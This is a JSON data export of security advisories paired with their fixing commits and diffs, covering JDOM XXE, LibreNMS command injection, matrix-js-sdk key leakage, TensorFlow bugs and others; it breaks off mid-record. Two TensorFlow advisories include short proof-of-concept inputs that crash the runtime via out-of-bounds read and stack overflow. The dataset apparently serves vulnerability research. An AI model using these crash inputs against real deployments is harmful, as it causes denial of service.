{"schema":{"fields":[{"name":"index","type":"integer"},{"name":"vuln_id","type":"string"},{"name":"cwe_id","type":"string"},{"name":"score","type":"number"},{"name":"chain","type":"string"},{"name":"dataset","type":"string"},{"name":"summary","type":"string"},{"name":"published_date","type":"string"},{"name":"chain_len","type":"integer"},{"name":"project","type":"string"},{"name":"commit_href","type":"string"},{"name":"commit_sha","type":"string"},{"name":"patch","type":"string"},{"name":"chain_ord","type":"string"},{"name":"before_first_fix_commit","type":"string"},{"name":"last_fix_commit","type":"string"},{"name":"chain_ord_pos","type":"number"},{"name":"commit_datetime","type":"string"},{"name":"message","type":"string"},{"name":"author","type":"string"},{"name":"comments","type":"string"},{"name":"stats","type":"string"},{"name":"files","type":"string"},{"name":"message_norm","type":"string"},{"name":"language","type":"string"},{"name":"entities","type":"string"},{"name":"classification_level_1","type":"string"},{"name":"classification_level_2","type":"string"},{"name":"list_files","type":"string"},{"name":"num_files","type":"number"}],"primaryKey":["index"],"pandas_version":"1.4.0"},"data":[{"index":5,"vuln_id":"GHSA-2363-cqg2-863c","cwe_id":"{'CWE-611'}","score":7.5,"chain":"{'https:\/\/github.com\/hunterhacker\/jdom\/commit\/dd4f3c2fc7893edd914954c73eb577f925a7d361'}","dataset":"osv","summary":"XML External Entity (XXE) Injection in JDOM An XXE issue in SAXBuilder in JDOM through 2.0.6 allows attackers to cause a denial of service via a crafted HTTP request.  At this time there is not released fixed version of JDOM.  As a workaround, to avoid external entities being expanded, one can call `builder.setExpandEntities(false)` and they won't be expanded.","published_date":"2021-07-27","chain_len":1,"project":"https:\/\/github.com\/hunterhacker\/jdom","commit_href":"https:\/\/github.com\/hunterhacker\/jdom\/commit\/dd4f3c2fc7893edd914954c73eb577f925a7d361","commit_sha":"dd4f3c2fc7893edd914954c73eb577f925a7d361","patch":"SINGLE","chain_ord":"['dd4f3c2fc7893edd914954c73eb577f925a7d361']","before_first_fix_commit":"{'1f81562b5cc813bfbacb7e2842b5be17eb34896b'}","last_fix_commit":"dd4f3c2fc7893edd914954c73eb577f925a7d361","chain_ord_pos":1.0,"commit_datetime":"07\/02\/2021, 03:42:05","message":"Addresses #189 - synchronizes external entity expansion setting","author":"Rolf Lear","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'core\/src\/java\/org\/jdom2\/input\/SAXBuilder.java': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hunterhacker\/jdom\/raw\/dd4f3c2fc7893edd914954c73eb577f925a7d361\/core%2Fsrc%2Fjava%2Forg%2Fjdom2%2Finput%2FSAXBuilder.java', 'patch': '@@ -82,6 +82,7 @@ OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT\\n import org.jdom2.DocType;\\n import org.jdom2.Document;\\n import org.jdom2.EntityRef;\\n+import org.jdom2.JDOMConstants;\\n import org.jdom2.JDOMException;\\n import org.jdom2.JDOMFactory;\\n import org.jdom2.Verifier;\\n@@ -797,6 +798,11 @@ public void setFastReconfigure(final boolean fastReconfigure) {\\n \\tpublic void setFeature(final String name, final boolean value) {\\n \\t\\t\/\/ Save the specified feature for later.\\n \\t\\tfeatures.put(name, value ? Boolean.TRUE : Boolean.FALSE);\\n+\\t\\tif (JDOMConstants.SAX_FEATURE_EXTERNAL_ENT.equals(name)) {\\n+\\t\\t\\t\/\/ See issue https:\/\/github.com\/hunterhacker\/jdom\/issues\/189\\n+\\t\\t\\t\/\/ And PR https:\/\/github.com\/hunterhacker\/jdom\/pull\/188\\n+\\t\\t\\tsetExpandEntities(value);\\n+\\t\\t}\\n \\t\\tengine = null;\\n \\t}'}}","message_norm":"addresses #189 - synchronizes external entity expansion setting","language":"en","entities":"[('#189', 'ISSUE', ''), ('external entity', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/java\/org\/jdom2\/input\/SAXBuilder.java'])","num_files":1.0},{"index":7,"vuln_id":"GHSA-23c7-6444-399m","cwe_id":"{'CWE-284', 'CWE-20'}","score":7.6,"chain":"{'https:\/\/github.com\/MirahezeBots\/sopel-channelmgnt\/commit\/643388365f28c5cc682254ab913c401f0e53260a', 'https:\/\/github.com\/MirahezeBots\/sopel-channelmgnt\/commit\/7c96d400358221e59135f0a0be0744f3fad73856'}","dataset":"osv","summary":"Improper Input Validation in sopel-plugins.channelmgnt ### Impact\nOn some IRC servers, restrictions around the removal of the bot using the kick\/kickban command could be bypassed when kicking multiple users at once.\nWe also believe it may have been possible to remove users from other channels but due to the wonder that is IRC and following RfCs, We have no POC for that.\n\nFreenode is not affected.\n\n### Patches\nUpgrade to 2.0.1 or higher\n\n### Workarounds\nDo not use this plugin on networks where TARGMAX > 1.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue on [phab](https:\/\/phab.mirahezebots.org\/maniphest\/task\/edit\/form\/1\/).\n* Email us at [staff(at)mirahezebots(dot)org](mailto:staff@mirahezebots.org)","published_date":"2021-04-09","chain_len":2,"project":"https:\/\/github.com\/MirahezeBots\/sopel-channelmgnt","commit_href":"https:\/\/github.com\/MirahezeBots\/sopel-channelmgnt\/commit\/643388365f28c5cc682254ab913c401f0e53260a","commit_sha":"643388365f28c5cc682254ab913c401f0e53260a","patch":"MULTI","chain_ord":"['643388365f28c5cc682254ab913c401f0e53260a', '7c96d400358221e59135f0a0be0744f3fad73856']","before_first_fix_commit":"{'2f191af1a14fd5fbea7cba6b4ff078af253d3a05'}","last_fix_commit":"7c96d400358221e59135f0a0be0744f3fad73856","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2021, 17:08:28","message":"Merge pull request from GHSA-23c7-6444-399m\n\n* ban use of , & # when kicking\n\n* Update __init__.py","author":"RhinosF1","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'sopel_channelmgnt\/channelmgnt\/__init__.py': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/FOSSBots\/sopel-channelmgnt\/raw\/643388365f28c5cc682254ab913c401f0e53260a\/sopel_channelmgnt%2Fchannelmgnt%2F__init__.py', 'patch': '@@ -216,6 +216,10 @@ def kick(bot, trigger):\\n             return\\n         nick = Identifier(text[1])\\n         reason = \\' \\'.join(text[2:])\\n+        if \\',\\' in str(nick):\\n+            return bot.reply(\\'Unable to kick. Kicking multiple users is not allowed.\\') \\n+        if \\'#\\' in str(nick):\\n+            return bot.reply(\\'Unable to kick. Use of # when kicking is not expected.\\')\\n         if nick != bot.config.core.nick and trigger.account in chanops:\\n             bot.write([\\'KICK\\', trigger.sender, nick, \\':\\' + reason])\\n             if dodeop:\\n@@ -263,6 +267,10 @@ def parse_host_mask(text):\\n @example(\\'.ban nick\\')\\n def ban(bot, trigger):\\n     \"\"\"Ban a user from the channel. The bot must be a channel operator for this command to work.\"\"\"\\n+    if \\',\\' in str(nick):\\n+        return bot.reply(\\'Unable to ban. Banning multiple users is not allowed.\\') \\n+    if \\'#\\' in str(nick):\\n+        return bot.reply(\\'Unable to ban. Use of # when banning is not expected.\\')\\n     makemodechange(bot, trigger, \\'+b\\', isbqmode=True)\\n \\n \\n@@ -312,6 +320,10 @@ def kickban(bot, trigger):\\n                 deopbot(trigger.sender, bot)\\n             return\\n         nick = Identifier(text[1])\\n+        if \\',\\' in str(nick):\\n+            return bot.reply(\\'Unable to kickban. Kickbanning multiple users is not allowed.\\') \\n+        if \\'#\\' in str(nick):\\n+            return bot.reply(\\'Unable to kickban. Use of # when kickbanning is not expected.\\')\\n         mask = text[2] if any(s in text[2] for s in \\'!@*\\') else \\'\\'\\n         reasonidx = 3 if mask != \\'\\' else 2\\n         reason = \\' \\'.join(text[reasonidx:])'}}","message_norm":"merge pull request from ghsa-23c7-6444-399m\n\n* ban use of , & # when kicking\n\n* update __init__.py","language":"en","entities":"[('ghsa-23c7-6444-399m', 'VULNID', 'GHSA')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['sopel_channelmgnt\/channelmgnt\/__init__.py'])","num_files":1.0},{"index":9,"vuln_id":"GHSA-23cm-x6j7-6hq3","cwe_id":"{'CWE-200'}","score":5.9,"chain":"{'https:\/\/github.com\/matrix-org\/matrix-js-sdk\/commit\/894c24880da0e1cc81818f51c0db80e3c9fb2be9'}","dataset":"osv","summary":"matrix-js-sdk can be tricked into disclosing E2EE room keys to a participating homeserver ### Impact\n\nA logic error in the room key sharing functionality of matrix-js-sdk before 12.4.1 allows a malicious Matrix homeserver\u2020 participating in an encrypted room to steal room encryption keys from affected Matrix clients participating in that room. This allows the homeserver to decrypt end-to-end encrypted messages sent by affected clients.\n\n\u2020 Or anyone with access to the account of the original recipient of an encrypted message.\n\nKnown clients affected (via their use of vulnerable versions of matrix-js-sdk):\n\n- Element Web (1.8.2 and earlier)\n- Element Desktop (1.8.2 and earlier)\n- SchildiChat Web (1.7.32-sc1 and earlier)\n- SchildiChat Desktop (1.7.32-sc1 and earlier)\n- Cinny (1.2.0 and earlier)\n\n### Patch\n\nThis was fixed in https:\/\/github.com\/matrix-org\/matrix-js-sdk\/commit\/894c24880da0e1cc81818f51c0db80e3c9fb2be9.\n\n### Workarounds\nTo prevent a homeserver from being able to steal the room keys, vulnerable clients can be taken offline or signed out. If signing out, care should be taken to either set up Secure Backup or export E2E room keys in order to preserve access to past messages.","published_date":"2021-09-14","chain_len":1,"project":"https:\/\/github.com\/matrix-org\/matrix-js-sdk","commit_href":"https:\/\/github.com\/matrix-org\/matrix-js-sdk\/commit\/894c24880da0e1cc81818f51c0db80e3c9fb2be9","commit_sha":"894c24880da0e1cc81818f51c0db80e3c9fb2be9","patch":"SINGLE","chain_ord":"['894c24880da0e1cc81818f51c0db80e3c9fb2be9']","before_first_fix_commit":"{'f8186add92dd5f0ca2f6a1cda10bc0ece3730f86'}","last_fix_commit":"894c24880da0e1cc81818f51c0db80e3c9fb2be9","chain_ord_pos":1.0,"commit_datetime":"09\/13\/2021, 11:34:48","message":"Verify target device key on reshare","author":"RiotRobot","comments":null,"stats":"{'additions': 29, 'deletions': 9, 'total': 38}","files":"{'src\/crypto\/algorithms\/megolm.ts': {'additions': 29, 'deletions': 9, 'changes': 38, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/matrix-org\/matrix-js-sdk\/raw\/894c24880da0e1cc81818f51c0db80e3c9fb2be9\/src%2Fcrypto%2Falgorithms%2Fmegolm.ts', 'patch': '@@ -101,6 +101,13 @@ interface IPayload extends Partial<IMessage> {\\n }\\n \/* eslint-enable camelcase *\/\\n \\n+interface SharedWithData {\\n+    \/\/ The identity key of the device we shared with\\n+    deviceKey: string;\\n+    \/\/ The message index of the ratchet we shared with that device\\n+    messageIndex: number;\\n+}\\n+\\n \/**\\n  * @private\\n  * @constructor\\n@@ -115,12 +122,12 @@ interface IPayload extends Partial<IMessage> {\\n  *\\n  * @property {object} sharedWithDevices\\n  *    devices with which we have shared the session key\\n- *        userId -> {deviceId -> msgindex}\\n+ *        userId -> {deviceId -> SharedWithData}\\n  *\/\\n class OutboundSessionInfo {\\n     public useCount = 0;\\n     public creationTime: number;\\n-    public sharedWithDevices: Record<string, Record<string, number>> = {};\\n+    public sharedWithDevices: Record<string, Record<string, SharedWithData>> = {};\\n     public blockedDevicesNotified: Record<string, Record<string, boolean>> = {};\\n \\n     constructor(public readonly sessionId: string, public readonly sharedHistory = false) {\\n@@ -150,11 +157,11 @@ class OutboundSessionInfo {\\n         return false;\\n     }\\n \\n-    public markSharedWithDevice(userId: string, deviceId: string, chainIndex: number): void {\\n+    public markSharedWithDevice(userId: string, deviceId: string, deviceKey: string, chainIndex: number): void {\\n         if (!this.sharedWithDevices[userId]) {\\n             this.sharedWithDevices[userId] = {};\\n         }\\n-        this.sharedWithDevices[userId][deviceId] = chainIndex;\\n+        this.sharedWithDevices[userId][deviceId] = { deviceKey, messageIndex: chainIndex };\\n     }\\n \\n     public markNotifiedBlockedDevice(userId: string, deviceId: string): void {\\n@@ -572,6 +579,7 @@ class MegolmEncryption extends EncryptionAlgorithm {\\n         payload: IPayload,\\n     ): Promise<void> {\\n         const contentMap = {};\\n+        const deviceInfoByDeviceId = new Map<string, DeviceInfo>();\\n \\n         const promises = [];\\n         for (let i = 0; i < userDeviceMap.length; i++) {\\n@@ -584,6 +592,7 @@ class MegolmEncryption extends EncryptionAlgorithm {\\n             const userId = val.userId;\\n             const deviceInfo = val.deviceInfo;\\n             const deviceId = deviceInfo.deviceId;\\n+            deviceInfoByDeviceId.set(deviceId, deviceInfo);\\n \\n             if (!contentMap[userId]) {\\n                 contentMap[userId] = {};\\n@@ -636,7 +645,10 @@ class MegolmEncryption extends EncryptionAlgorithm {\\n                 for (const userId of Object.keys(contentMap)) {\\n                     for (const deviceId of Object.keys(contentMap[userId])) {\\n                         session.markSharedWithDevice(\\n-                            userId, deviceId, chainIndex,\\n+                            userId,\\n+                            deviceId,\\n+                            deviceInfoByDeviceId.get(deviceId).getIdentityKey(),\\n+                            chainIndex,\\n                         );\\n                     }\\n                 }\\n@@ -719,19 +731,27 @@ class MegolmEncryption extends EncryptionAlgorithm {\\n             logger.debug(`megolm session ${sessionId} never shared with user ${userId}`);\\n             return;\\n         }\\n-        const sentChainIndex = obSessionInfo.sharedWithDevices[userId][device.deviceId];\\n-        if (sentChainIndex === undefined) {\\n+        const sessionSharedData = obSessionInfo.sharedWithDevices[userId][device.deviceId];\\n+        if (sessionSharedData === undefined) {\\n             logger.debug(\\n                 \"megolm session ID \" + sessionId + \" never shared with device \" +\\n                 userId + \":\" + device.deviceId,\\n             );\\n             return;\\n         }\\n \\n+        if (sessionSharedData.deviceKey !== device.getIdentityKey()) {\\n+            logger.warn(\\n+                `Session has been shared with device ${device.deviceId} but with identity ` +\\n+                `key ${sessionSharedData.deviceKey}. Key is now ${device.getIdentityKey()}!`,\\n+            );\\n+            return;\\n+        }\\n+\\n         \/\/ get the key from the inbound session: the outbound one will already\\n         \/\/ have been ratcheted to the next chain index.\\n         const key = await this.olmDevice.getInboundGroupSessionKey(\\n-            this.roomId, senderKey, sessionId, sentChainIndex,\\n+            this.roomId, senderKey, sessionId, sessionSharedData.messageIndex,\\n         );\\n \\n         if (!key) {\\n@@ -882,7 +902,7 @@ class MegolmEncryption extends EncryptionAlgorithm {\\n             const deviceId = deviceInfo.deviceId;\\n \\n             session.markSharedWithDevice(\\n-                userId, deviceId, key.chain_index,\\n+                userId, deviceId, deviceInfo.getIdentityKey(), key.chain_index,\\n             );\\n         }'}}","message_norm":"verify target device key on reshare","language":"en","entities":"[('verify', 'ACTION', ''), ('key', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/crypto\/algorithms\/megolm.ts'])","num_files":1.0},{"index":10,"vuln_id":"GHSA-23f2-vgr6-fwv7","cwe_id":"{'CWE-74'}","score":0.0,"chain":"{'https:\/\/github.com\/librenms\/librenms\/commit\/8b82341cb742e7bd4966964b399012f7ba017e0b'}","dataset":"osv","summary":"Command injection in librenms LibreNMS v22.3.0 was discovered to contain multiple command injection vulnerabilities via the service_ip, hostname, and service_param parameters.","published_date":"2022-06-03","chain_len":1,"project":"https:\/\/github.com\/librenms\/librenms","commit_href":"https:\/\/github.com\/librenms\/librenms\/commit\/8b82341cb742e7bd4966964b399012f7ba017e0b","commit_sha":"8b82341cb742e7bd4966964b399012f7ba017e0b","patch":"SINGLE","chain_ord":"['8b82341cb742e7bd4966964b399012f7ba017e0b']","before_first_fix_commit":"{'3d0e095eb777845c39ed11d0981e0cef143d9f66'}","last_fix_commit":"8b82341cb742e7bd4966964b399012f7ba017e0b","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2022, 02:32:36","message":"Fix services command injection (#13932)\n\n* fix services command injection\r\n\r\n* Clean more variables\r\n\r\n* Update services.inc.php\r\n\r\n* Update services.inc.php","author":"Tony Murray","comments":"{'com_1': {'author': 'bakerds', 'datetime': '04\/22\/2022, 11:25:17', 'body': 'Hey @murrant, it looks like this breaks using IPv6 literals in the IP field of a service'}}","stats":"{'additions': 6, 'deletions': 1, 'total': 7}","files":"{'includes\/services.inc.php': {'additions': 6, 'deletions': 1, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/librenms\/librenms\/raw\/8b82341cb742e7bd4966964b399012f7ba017e0b\/includes%2Fservices.inc.php', 'patch': \"@@ -4,6 +4,7 @@\\n use LibreNMS\\\\Alert\\\\AlertRules;\\n use LibreNMS\\\\Config;\\n use LibreNMS\\\\RRD\\\\RrdDefinition;\\n+use LibreNMS\\\\Util\\\\Clean;\\n \\n function get_service_status($device = null)\\n {\\n@@ -120,6 +121,10 @@ function poll_service($service)\\n {\\n     $update = [];\\n     $old_status = $service['service_status'];\\n+    $service['service_type'] = Clean::fileName($service['service_type']);\\n+    $service['service_ip'] = Clean::fileName($service['service_ip']);\\n+    $service['hostname'] = Clean::fileName($service['hostname']);\\n+    $service['overwrite_ip'] = Clean::fileName($service['overwrite_ip']);\\n     $check_cmd = '';\\n \\n     \/\/ if we have a script for this check, use it.\\n@@ -130,7 +135,7 @@ function poll_service($service)\\n \\n     \/\/ If we do not have a cmd from the check script, build one.\\n     if ($check_cmd == '') {\\n-        $check_cmd = Config::get('nagios_plugins') . '\/check_' . $service['service_type'] . ' -H ' . ($service['service_ip'] ? $service['service_ip'] : $service['hostname']);\\n+        $check_cmd = Config::get('nagios_plugins') . '\/check_' . $service['service_type'] . ' -H ' . ($service['service_ip'] ?: $service['hostname']);\\n         $check_cmd .= ' ' . $service['service_param'];\\n     }\"}}","message_norm":"fix services command injection (#13932)\n\n* fix services command injection\r\n\r\n* clean more variables\r\n\r\n* update services.inc.php\r\n\r\n* update services.inc.php","language":"en","entities":"[('fix', 'ACTION', ''), ('command injection', 'SECWORD', ''), ('#13932', 'ISSUE', ''), ('command injection', 'SECWORD', ''), ('update', 'ACTION', ''), ('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['includes\/services.inc.php'])","num_files":1.0},{"index":12,"vuln_id":"GHSA-23fp-fmrv-f5px","cwe_id":"{'CWE-400'}","score":4.9,"chain":"{'https:\/\/github.com\/strapi\/strapi\/commit\/c0c191c08f05fe10d7a6b1bf9475c1a651a89362'}","dataset":"osv","summary":"Uncontrolled Resource Consumption in strapi A denial of service exists in strapi v3.0.0-beta.18.3 and earlier that can be abused in the admin console using admin rights can lead to arbitrary restart of the application.","published_date":"2021-12-10","chain_len":1,"project":"https:\/\/github.com\/strapi\/strapi","commit_href":"https:\/\/github.com\/strapi\/strapi\/commit\/c0c191c08f05fe10d7a6b1bf9475c1a651a89362","commit_sha":"c0c191c08f05fe10d7a6b1bf9475c1a651a89362","patch":"SINGLE","chain_ord":"['c0c191c08f05fe10d7a6b1bf9475c1a651a89362']","before_first_fix_commit":"{'7e3f7ee2de9eecd0bc098d7b77940b64f48b3a96'}","last_fix_commit":"c0c191c08f05fe10d7a6b1bf9475c1a651a89362","chain_ord_pos":1.0,"commit_datetime":"01\/07\/2020, 13:15:16","message":"chore(admin): Improve plugin name validator in install\/uninstall plugin","author":"Alexandre Bodin","comments":null,"stats":"{'additions': 13, 'deletions': 2, 'total': 15}","files":"{'packages\/strapi-admin\/controllers\/Admin.js': {'additions': 13, 'deletions': 2, 'changes': 15, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/strapi\/strapi\/raw\/c0c191c08f05fe10d7a6b1bf9475c1a651a89362\/packages%2Fstrapi-admin%2Fcontrollers%2FAdmin.js', 'patch': '@@ -7,6 +7,17 @@ const formatError = error => [\\n   { messages: [{ id: error.id, message: error.message, field: error.field }] },\\n ];\\n \\n+const PLUGIN_NAME_REGEX = \/^[A-Za-z][A-Za-z0-9-_]+$\/;\\n+\\n+\/**\\n+ * Validates a plugin name format\\n+ *\/\\n+const isValidPluginName = plugin => {\\n+  return (\\n+    _.isString(plugin) && !_.isEmpty(plugin) && PLUGIN_NAME_REGEX.test(plugin)\\n+  );\\n+};\\n+\\n \/**\\n  * A set of functions called \"actions\" for `Admin`\\n  *\/\\n@@ -67,7 +78,7 @@ module.exports = {\\n     try {\\n       const { plugin } = ctx.request.body;\\n \\n-      if (!\/^[A-Za-z0-9_-]+$\/.test(plugin)) {\\n+      if (!isValidPluginName(plugin)) {\\n         return ctx.badRequest(\\'Invalid plugin name\\');\\n       }\\n \\n@@ -107,7 +118,7 @@ module.exports = {\\n     try {\\n       const { plugin } = ctx.params;\\n \\n-      if (!\/^[A-Za-z0-9_-]+$\/.test(plugin)) {\\n+      if (!isValidPluginName(plugin)) {\\n         return ctx.badRequest(\\'Invalid plugin name\\');\\n       }'}}","message_norm":"chore(admin): improve plugin name validator in install\/uninstall plugin","language":"it","entities":"[('chore(admin', 'SECWORD', ''), ('improve', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/strapi-admin\/controllers\/Admin.js'])","num_files":1.0},{"index":13,"vuln_id":"GHSA-23hm-7w47-xw72","cwe_id":"{'CWE-125'}","score":8.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/23968a8bf65b009120c43b5ebcceaf52dbc9e943'}","dataset":"osv","summary":"Out of bounds read in Tensorflow ### Impact \nThe [implementation of `Dequantize`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/kernels\/dequantize_op.cc#L92-L153) does not fully validate the value of `axis` and can result in heap OOB accesses:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.Dequantize(\n    input=tf.constant([1,1],dtype=tf.qint32),\n    min_range=[1.0],\n    max_range=[10.0],\n    mode='MIN_COMBINED',\n    narrow_range=False,\n    axis=2**31-1,\n    dtype=tf.bfloat16)\n  return y\n\ntest()\n```\n\nThe `axis` argument can be `-1` (the default value for the optional argument) or any other positive value at most the number of dimensions of the input. Unfortunately, the upper bound is not checked and this results in reading past the end of the array containing the dimensions of the input tensor:\n    \n```cc   \n  if (axis_ > -1) {\n    num_slices = input.dim_size(axis_);\n  }\n  \/\/ ...\n  int64_t pre_dim = 1, post_dim = 1;\n  for (int i = 0; i < axis_; ++i) {\n    pre_dim *= float_output.dim_size(i);\n  }\n  for (int i = axis_ + 1; i < float_output.dims(); ++i) {\n    post_dim *= float_output.dim_size(i);\n  }\n``` \n      \n### Patches\nWe have patched the issue in GitHub commit [23968a8bf65b009120c43b5ebcceaf52dbc9e943](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/23968a8bf65b009120c43b5ebcceaf52dbc9e943).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n      \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/23968a8bf65b009120c43b5ebcceaf52dbc9e943","commit_sha":"23968a8bf65b009120c43b5ebcceaf52dbc9e943","patch":"SINGLE","chain_ord":"['23968a8bf65b009120c43b5ebcceaf52dbc9e943']","before_first_fix_commit":"{'566576746f47ebf42c38ebe01cca6dbb8832a9ef'}","last_fix_commit":"23968a8bf65b009120c43b5ebcceaf52dbc9e943","chain_ord_pos":1.0,"commit_datetime":"11\/20\/2021, 07:16:11","message":"Fix out of bound access in DequantizeOp by adding check for axis < input dimension\n\nPiperOrigin-RevId: 411214268\nChange-Id: I3249d2a69ddc82f182c589a3a5bbfb71543f4b29","author":"Isha Arkatkar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/dequantize_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/23968a8bf65b009120c43b5ebcceaf52dbc9e943\/tensorflow%2Fcore%2Fkernels%2Fdequantize_op.cc', 'patch': '@@ -94,6 +94,11 @@ class DequantizeOp : public OpKernel {\\n     const Tensor& input_min_tensor = ctx->input(1);\\n     const Tensor& input_max_tensor = ctx->input(2);\\n \\n+    OP_REQUIRES(\\n+        ctx, axis_ < input.dims(),\\n+        errors::InvalidArgument(\"Axis must be less than input dimension(\",\\n+                                input.dims(), \"), got \", axis_));\\n+\\n     int num_slices = 1;\\n     if (axis_ > -1) {\\n       num_slices = input.dim_size(axis_);'}}","message_norm":"fix out of bound access in dequantizeop by adding check for axis < input dimension\n\npiperorigin-revid: 411214268\nchange-id: i3249d2a69ddc82f182c589a3a5bbfb71543f4b29","language":"en","entities":"[('fix', 'ACTION', ''), ('out of bound access', 'SECWORD', ''), ('adding', 'ACTION', ''), ('411214268', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/dequantize_op.cc'])","num_files":1.0},{"index":20,"vuln_id":"GHSA-247x-2f9f-5wp7","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/448a16182065bd08a202d9057dd8ca541e67996c'}","dataset":"osv","summary":"Stack overflow in TensorFlow ### Impact\nThe `GraphDef` format in TensorFlow does not allow self recursive functions. The runtime assumes that this invariant is satisfied. However, a `GraphDef` containing a fragment such as the following can be consumed when loading a `SavedModel`:\n\n```\n  library {\n    function {\n      signature {\n        name: \"SomeOp\"\n        description: \"Self recursive op\"\n      }\n      node_def {\n        name: \"1\"\n        op: \"SomeOp\"\n      }\n      node_def {\n        name: \"2\"\n        op: \"SomeOp\"\n      }\n    }\n  } \n```\n\nThis would result in a stack overflow during execution as resolving each `NodeDef` means resolving the function itself and its nodes.\n\n### Patches\nWe have patched the issue in GitHub commit [448a16182065bd08a202d9057dd8ca541e67996c](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/448a16182065bd08a202d9057dd8ca541e67996c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/448a16182065bd08a202d9057dd8ca541e67996c","commit_sha":"448a16182065bd08a202d9057dd8ca541e67996c","patch":"SINGLE","chain_ord":"['448a16182065bd08a202d9057dd8ca541e67996c']","before_first_fix_commit":"{'7b1eba4193a389c7e92e01e585aeb71be97529cd'}","last_fix_commit":"448a16182065bd08a202d9057dd8ca541e67996c","chain_ord_pos":1.0,"commit_datetime":"12\/08\/2021, 00:49:32","message":"Prevent stack overflow when FunctionLib in GraphDef has a self-recursive function.\n\nIt is likely that no recursivity is supported, but we should handle this separately.\n\nPiperOrigin-RevId: 414860329\nChange-Id: I02a2270e86282b37362ddd485eeef16fb986a9e0","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 18, 'deletions': 0, 'total': 18}","files":"{'tensorflow\/cc\/saved_model\/loader.cc': {'additions': 18, 'deletions': 0, 'changes': 18, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/448a16182065bd08a202d9057dd8ca541e67996c\/tensorflow%2Fcc%2Fsaved_model%2Floader.cc', 'patch': '@@ -25,6 +25,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/attr_value.pb.h\"\\n #include \"tensorflow\/core\/framework\/function.pb.h\"\\n #include \"tensorflow\/core\/framework\/node_def.pb.h\"\\n+#include \"tensorflow\/core\/framework\/op_def.pb.h\"\\n #include \"tensorflow\/core\/framework\/tensor.pb.h\"\\n #include \"tensorflow\/core\/lib\/io\/path.h\"\\n #include \"tensorflow\/core\/lib\/monitoring\/counter.h\"\\n@@ -99,6 +100,19 @@ static Status ValidateNode(const NodeDef& node) {\\n   return Status::OK();\\n }\\n \\n+static Status ValidateFunctionNotRecursive(const FunctionDef& function) {\\n+  const auto& function_name = function.signature().name();\\n+  for (const auto& node : function.node_def()) {\\n+    if (node.op() == function_name) {\\n+      return errors::FailedPrecondition(\\n+          \"Function \", function_name,\\n+          \" is self recursive and TensorFlow does not support this scenario.\");\\n+    }\\n+  }\\n+\\n+  return Status::OK();\\n+}\\n+\\n static Status ValidateSavedTensors(const GraphDef& graph_def) {\\n   for (const auto& node : graph_def.node()) {\\n     TF_RETURN_IF_ERROR(ValidateNode(node));\\n@@ -110,6 +124,10 @@ static Status ValidateSavedTensors(const GraphDef& graph_def) {\\n       for (const auto& node : function.node_def()) {\\n         TF_RETURN_IF_ERROR(ValidateNode(node));\\n       }\\n+\\n+      \/\/ Also check that there is no recursivity in the library\\n+      \/\/ TODO(mihaimaruseac): Do more than self-recursivity\\n+      TF_RETURN_IF_ERROR(ValidateFunctionNotRecursive(function));\\n     }\\n   }'}}","message_norm":"prevent stack overflow when functionlib in graphdef has a self-recursive function.\n\nit is likely that no recursivity is supported, but we should handle this separately.\n\npiperorigin-revid: 414860329\nchange-id: i02a2270e86282b37362ddd485eeef16fb986a9e0","language":"en","entities":"[('prevent', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('414860329', 'SHA', 